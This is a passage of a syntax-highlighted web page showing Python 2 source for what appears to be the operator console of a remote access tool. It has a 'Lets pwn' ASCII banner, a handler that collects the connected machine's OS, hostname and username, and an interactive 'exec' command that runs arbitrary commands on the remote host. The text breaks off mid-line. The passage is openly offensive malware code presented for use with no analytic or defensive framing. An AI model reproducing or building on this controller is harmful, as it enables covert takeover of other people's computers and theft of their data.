comments">==+===ss======+=&lt;~((&lt;+==((&lt;&lt;(~~(((-&lt;=+~--~(&lt;+++++=+&lt;&lt;(((&lt;+&lt;+</code></div><div class="line number69 index68 alt2"><code class="python comments">s=====ssss=+++==++++=&lt;++(&lt;+~~---((~++(((((&lt;++++&lt;+++&lt;&lt;((((&lt;&lt;=</code></div><div class="line number70 index69 alt1"><code class="python comments">ss===sss=s==s=+=+++++&lt;&lt;+(&lt;(~~~~-~(~&lt;&lt;~(&lt;&lt;&lt;&lt;=&lt;&lt;=+++&lt;&lt;&lt;&lt;((&lt;&lt;&lt;=</code></div><div class="line number71 index70 alt2"><code class="python comments">sss==sszssss=s=+++++&lt;((&lt;=&lt;(~~~~--~&lt;=&lt;~~(&lt;&lt;&lt;+&lt;&lt;+++&lt;&lt;+&lt;&lt;&lt;(+&lt;&lt;s</code></div><div class="line number72 index71 alt1"><code class="python comments">sssssszzszss=====+++&lt;((=s&lt;(~~~~~~~+=(~(~(+&lt;&lt;++++++==++&lt;&lt;=&lt;=s</code></div><div class="line number73 index72 alt2"><code class="python comments">ssssszhhzzzssss==++&lt;&lt;((+s+&lt;(~~~~~(=+--~~~&lt;&lt;&lt;++++===s++&lt;+++zs</code></div><div class="line number74 index73 alt1"><code class="python comments">zssssszzzzzhzsss=++&lt;&lt;~(&lt;+=&lt;&lt;((~(((=(-'~(((&lt;+++=szs=s=++++=zz</code></div><div class="line number75 index74 alt2"><code class="python comments">hsszzssszzzhzss=s++&lt;((((+===&lt;((&lt;+&lt;+~'--~(&lt;&lt;&lt;=sszsss====+=szz</code></div><div class="line number76 index75 alt1"><code class="python comments">hzsszzzsszzzhsszz=&lt;&lt;&lt;&lt;&lt;&lt;=szz=+==ss=&lt;-~~(~(+=+=sss==s===+szzz</code></div><div class="line number77 index76 alt2"><code class="python comments">hhzsszzzzzzzzzzhzss=&lt;+++shDhhzzhhhh(~(((&lt;+=+=ssssszss===szzs</code></div><div class="line number78 index77 alt1"><code class="python comments">zhzssszzzzzzzhz=+=s+==+&lt;&lt;zDDDDhDDz&lt;'~(&lt;&lt;+&lt;((=ssszzzs===zzzss</code></div><div class="line number79 index78 alt2"><code class="python comments">hhhhzzzzzzzzzhz=ss=s++&lt;&lt;(&lt;zBDDDDh&lt;'~~(~(&lt;&lt;++====+===++szzsss</code></div><div class="line number80 index79 alt1"><code class="python comments">hhhhzzzzzzzzzzzssszzss==+&lt;+hDDDD+~~(&lt;+&lt;+=+++szzzzzs==szzssss</code></div><div class="line number81 index80 alt2"><code class="python comments">zhhhhhhzzzzzzzzzss=======+++hBB=(&lt;&lt;&lt;(&lt;&lt;++==szssszs=+=zhzzsss</code></div><div class="line number82 index81 alt1"><code class="python comments">zhhhDhhzzzsszzzhzsszzss+===+sDh+==+&lt;&lt;++===ssssssss=szhhzzzzs</code></div><div class="line number83 index82 alt2"><code class="python comments">hhhhhhhhzzzzhhhhhzsssss=ssssshzs=++=+=+==sssssss=sszhzzzzzzs</code></div><div class="line number84 index83 alt1"><code class="python comments">zzhhhhhhDDhhhhhhhzzzssssszsszhhz=======ssssszsss=shhhzzzsszs</code></div><div class="line number85 index84 alt2"><code class="python comments">zzzhzhhDDDDDhhhhhhhzzzzhhhzhhhhhzzzhzssszzzzzzszhzhhzzzzzzzs</code></div><div class="line number86 index85 alt1"><code class="python comments">zzzzhhhhDhDDDhhhDhhhhzzhhhhzzhzzhhhhzszzhzzszhhhhhhzzzzsszzs</code></div><div class="line number87 index86 alt2"><code class="python comments">zzzhhhhhDDDDDDDDDDDhhhzs=zzzzzzzss=szzhhhhhhhDDhhzzzzzzzzsss</code></div><div class="line number88 index87 alt1"><code class="python comments">zzzhhhhhDhhhDDDDDDDDDDhzzs=szss==szzhhDDDDDDDDhhhhzzzzzzzzsz</code></div><div class="line number89 index88 alt2"><code class="python comments">zzhhhhhhhhhhDDDDDDDDDDDDDzs=ss==szDDDDDDDDDDDhhDDhhzzzzzzzsz</code></div><div class="line number90 index89 alt1"><code class="python comments">zzhhzhhhhhhDDDDDDDDDDDDDDDhhhhzhDDDhDDDDDDhhhhhhhhhzzzzzzzsz</code></div><div class="line number91 index90 alt2"><code class="python comments">zzzzzhhhhhhhDDDDDDDDDDDDDDDDDDDDDDhDDDhhhhhhhzhzzzhzzzzzzzzs</code></div><div class="line number92 index91 alt1">&nbsp;</div><div class="line number93 index92 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">--=[ Version 1.0 Alpha Scarlet ]=--</code></div><div class="line number94 index93 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python comments">--=[ I am ready ... Lets pwn&nbsp;&nbsp; ]=--</code></div><div class="line number95 index94 alt2">&nbsp;</div><div class="line number96 index95 alt1"><code class="python comments">'''</code></div><div class="line number97 index96 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">return</code> <code class="python plain">script_colors(</code><code class="python string">'gray'</code><code class="python plain">,banner)</code></div><div class="line number98 index97 alt1">&nbsp;</div><div class="line number99 index98 alt2"><code class="python comments"># 控制台函数</code></div><div class="line number100 index99 alt1"><code class="python keyword">def</code> <code class="python plain">console(connection, address):</code></div><div class="line number101 index100 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">" [ Info ] "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">, </code><code class="python string">"Connection Established from %s\n"</code> <code class="python keyword">%</code> <code class="python plain">(address))</code></div><div class="line number102 index101 alt1">&nbsp;</div><div class="line number103 index102 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">sysinfo </code><code class="python keyword">=</code> <code class="python plain">connection.recv(</code><code class="python value">2048</code><code class="python plain">).split(</code><code class="python string">","</code><code class="python plain">)</code></div><div class="line number104 index103 alt1">&nbsp;</div><div class="line number105 index104 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">=</code> <code class="python plain">''</code></div><div class="line number106 index105 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"Operating System: "</code><code class="python plain">) </code><code class="python keyword">+</code><code class="python string">"%s\n"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">,sysinfo[</code><code class="python value">0</code><code class="python plain">]))</code></div><div class="line number107 index106 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"Computer Name: "</code><code class="python plain">) </code><code class="python keyword">+</code><code class="python string">"%s\n"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">,sysinfo[</code><code class="python value">1</code><code class="python plain">]))</code></div><div class="line number108 index107 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"Username: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s\n"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">,sysinfo[</code><code class="python value">5</code><code class="python plain">]))</code></div><div class="line number109 index108 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"Release Version: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s\n"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">,sysinfo[</code><code class="python value">2</code><code class="python plain">]))</code></div><div class="line number110 index109 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"System Version: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s\n"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">,sysinfo[</code><code class="python value">3</code><code class="python plain">]))</code></div><div class="line number111 index110 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">x_info </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">,</code><code class="python string">"Machine Architecture: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">,sysinfo[</code><code class="python value">4</code><code class="python plain">]))</code></div><div class="line number112 index111 alt1">&nbsp;</div><div class="line number113 index112 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">sysinfo[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Linux"</code><code class="python plain">:</code></div><div class="line number114 index113 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">user </code><code class="python keyword">=</code> <code class="python plain">sysinfo[</code><code class="python value">6</code><code class="python plain">] </code><code class="python keyword">+</code> <code class="python string">"@"</code> <code class="python keyword">+</code> <code class="python plain">address</code></div><div class="line number115 index114 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">sysinfo[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Windows"</code><code class="python plain">:</code></div><div class="line number116 index115 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">user </code><code class="python keyword">=</code> <code class="python plain">sysinfo[</code><code class="python value">7</code><code class="python plain">] </code><code class="python keyword">+</code> <code class="python string">"@"</code> <code class="python keyword">+</code> <code class="python plain">address</code></div><div class="line number117 index116 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">else</code><code class="python plain">:</code></div><div class="line number118 index117 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">user </code><code class="python keyword">=</code> <code class="python string">"Unknown@"</code> <code class="python keyword">+</code> <code class="python plain">address</code></div><div class="line number119 index118 alt2">&nbsp;</div><div class="line number120 index119 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python value">1</code><code class="python plain">:</code></div><div class="line number121 index120 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">command </code><code class="python keyword">=</code> <code class="python functions">raw_input</code><code class="python plain">(</code><code class="python string">" "</code> <code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"underline"</code><code class="python plain">,</code></div><div class="line number122 index121 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">script_colors(</code><code class="python string">"lgray"</code><code class="python plain">,</code><code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(user))) </code><code class="python keyword">+</code> <code class="python string">" "</code> <code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">'lgray'</code><code class="python plain">,</code><code class="python string">"&gt;"</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">" "</code><code class="python plain">).strip()</code></div><div class="line number123 index122 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">command.split(</code><code class="python string">" "</code><code class="python plain">)[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"exec"</code><code class="python plain">:</code></div><div class="line number124 index123 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python functions">len</code><code class="python plain">(command.split(</code><code class="python string">" "</code><code class="python plain">)) </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python value">1</code><code class="python plain">:</code></div><div class="line number125 index124 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"r"</code><code class="python plain">, </code><code class="python string">"\n [!] "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python plain">script_colors(</code><code class="python string">"b"</code><code class="python plain">, </code><code class="python string">"Command: exec &lt;command&gt;"</code><code class="python plain">)</code></div><div class="line number126 index125 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"\n Execute Argument As Command On Remote Host\n"</code><code class="python plain">)</code></div><div class="line number127 index126 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">continue</code></div><div class="line number128 index127 alt1">&nbsp;</div><div class="line number129 index128 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">res </code><code class="python keyword">=</code> <code class="python value">1</code></div><div class="line number130 index129 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">msg </code><code class="python keyword">=</code> <code class="python string">" "</code></div><div class="line number131 index130 alt2">&nbsp;</div><div class="line number132 index131 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">while</code> <code class="python functions">len</code><code class="python plain">(command.split(</code><code class="python string">" "</code><code class="python plain">)) &gt; res:</code></div><div class="line number133 index132 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">msg </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python plain">command.split(</code><code class="python string">" "</code><code class="python plain">)[res] </code><code class="python keyword">+</code> <code class="python string">" "</code></div><div class="line number134 index133 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">res </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python value">1</code></div><div class="line number135 index134 alt2">&nbsp;</div><div class="line number136 index135 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">response </code><code class="python keyword">=</code> <code class="python plain">send_data(connection,</code><code class="python string">"exec "</code> <code class="python keyword">+</code> <code class="python plain">msg)</code></div><div class="line number137 index136 alt2">&nbsp;</div><div class="line number138 index137 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">response.split(</code><code class="python string">"\n"</code><code class="python plain">)[</code><code class="python keyword">-</code><code class="python value">1</code><code class="python plain">].strip() !</code><code class="python keyword">=</code> <code class="python plain">"":</code></div><div class="line number139 index138 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">response </code><code class="python keyword">+</code><code class="python keyword">=</code> <code class="python string">"\n"</code></div><div class="line number140 index139 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">response.split(</code><code class="python string">"\n"</code><code class="python plain">)[</code><code class="python value">0</code><code class="python plain">].strip()!</code><code class="python keyword">=</code><code class="python plain">"":</code></div><div class="line number141 index140 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">response </code><code class="python keyword">=</code> <code class="python string">"\n"</code> <code class="python keyword">+</code> <code class="python plain">response</code></div><div class="line number142 index141 alt1">&nbsp;</div><div class="line number143 index142 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">for</code> <code class="python plain">x </code><code class="python keyword">in</code> <code class="python plain">response.split(</code><code class="python string">"\n"</code><code class="python plain">):</code></div><div class="line number144 index143 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python string">" "</code> <code class="python keyword">+</code> <code class="python plain">x</code></div><div class="line number145 index144 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python plain">"":</code></div><div class="line number146 index145 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">continue</code></div><div class="line number147 index146 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"cls"</code><code class="python plain">:</code></div><div class="line number148 index147 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">sysinfo[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Linux"</code><code class="python plain">:</code></div><div class="line number149 index148 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dp </code><code class="python keyword">=</code> <code class="python plain">os.system(</code><code class="python string">"clear"</code><code class="python plain">)</code></div><div class="line number150 index149 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">sysinfo[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Windows"</code><code class="python plain">:</code></div><div class="line number151 index150 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">dp </code><code class="python keyword">=</code> <code class="python plain">os.system(</code><code class="python string">"cls"</code><code class="python plain">)</code></div><div class="line number152 index151 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"help"</code><code class="python plain">:</code></div><div class="line number153 index152 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"lgray"</code><code class="python plain">,</code><code class="python functions">help</code><code class="python plain">())</code></div><div class="line number154 index153 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">command </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"sysinfo"</code><code class="python plain">:</code></div><div class="line number155 index154 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">if</code> <code class="python plain">sysinfo[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Linux"</code><code class="python plain">:</code></div><div class="line number156 index155 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Operating System: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">0</code><code class="python plain">]))</code></div><div class="line number157 index156 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Computer Name: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">1</code><code class="python plain">]))</code></div><div class="line number158 index157 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Username: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">6</code><code class="python plain">]))</code></div><div class="line number159 index158 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Release Version: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">2</code><code class="python plain">]))</code></div><div class="line number160 index159 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"System Version: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">3</code><code class="python plain">]))</code></div><div class="line number161 index160 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Machine Architecture: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">4</code><code class="python plain">]))</code></div><div class="line number162 index161 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python keyword">elif</code> <code class="python plain">sysinfo[</code><code class="python value">0</code><code class="python plain">] </code><code class="python keyword">=</code><code class="python keyword">=</code> <code class="python string">"Windows"</code><code class="python plain">:</code></div><div class="line number163 index162 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Operating System: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">0</code><code class="python plain">]))</code></div><div class="line number164 index163 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Computer Name: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">1</code><code class="python plain">]))</code></div><div class="line number165 index164 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Username: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python value">7</code><code class="python plain">]))</code></div><div class="line number166 index165 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python functions">print</code> <code class="python plain">script_colors(</code><code class="python string">"g"</code><code class="python plain">, </code><code class="python string">"Release Version: "</code><code class="python plain">) </code><code class="python keyword">+</code> <code class="python string">"%s"</code> <code class="python keyword">%</code> <code class="python plain">(script_colors(</code><code class="python string">"b"</code><code class="python plain">, sysinfo[</code><code class="python 